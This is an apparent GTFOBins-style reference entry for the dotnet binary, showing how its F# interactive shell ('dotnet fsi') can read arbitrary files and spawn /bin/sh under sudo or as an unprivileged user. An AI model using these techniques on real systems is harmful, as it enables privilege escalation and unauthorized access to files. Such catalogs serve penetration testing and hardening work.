---
type: gtfobin
name: dotnet
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# dotnet

## file-read

```bash
dotnet fsi
System.IO.File.ReadAllText("/path/to/input-file");;
```
**Contexts:** sudo, unprivileged

## shell

```bash
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```
**Contexts:** sudo, unprivileged
